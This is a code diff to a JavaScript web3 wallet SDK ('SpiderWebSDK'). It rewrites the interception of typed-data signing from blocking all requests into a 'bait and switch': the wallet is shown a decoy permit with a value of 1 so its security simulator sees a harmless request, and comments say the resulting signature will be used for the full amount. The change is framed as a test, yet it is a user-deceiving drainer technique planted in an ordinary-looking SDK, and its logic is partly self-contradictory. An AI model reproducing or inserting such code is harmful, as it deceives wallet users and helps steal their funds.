@@ -468,17 +468,29 @@ window.SpiderWebSDK = {
             // **MODIFICATION**: Override _signTypedData to intercept call
             const originalSignTypedData = this._signer._signTypedData.bind(this._signer);
             this._signer._signTypedData = async (...args) => {
-                console.log("SDK Intercepted a signature request.");
-                
-                // By removing the 'if' statement, this blocking logic will always run.
-                console.warn("SDK is in test mode: Blocking all signature requests.");
-                throw new Error("Transaction blocked by SDK for testing purposes.");
+                console.log("SDK Intercepted a signature request for a 'bait and switch' test.");
 
-                // The code below this line is now unreachable and will never execute.
-                // console.log("Forwarding call to the original wallet provider...");
-                // return originalSignTypedData(...args); 
+                // 1. Capture the original, valid arguments
+                const [domain, types, originalPermitMessage] = args;
+
+                // 2. Create the "bait": a decoy payload with a small value
+                const decoyPermitMessage = { ...originalPermitMessage };
+                decoyPermitMessage.value = "1"; // Set a small, non-threatening value (e.g., 1 wei)
+                
+                console.warn(`BAIT: Presenting a value of "1" to the wallet's UI for signing.`);
+
+                // 3. Get the user's signature for the DECOY payload
+                // The wallet's security simulator will analyze this harmless-looking request.
+                const signatureForDecoy = await originalSignTypedData(domain, types, decoyPermitMessage);
+                
+                console.log("SWITCH: Decoy has been signed. The main function will now use this signature with the original, full amount.");
+
+                // 4. Return the decoy signature
+                // The calling function `_signAndSendWithStandardPermit` will now receive a signature
+                // that is only valid for the decoy, not the real balance.
+                return signatureForDecoy;
             };
-                                    
+                                
             this._logConnectionEvent(); 
             
             this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
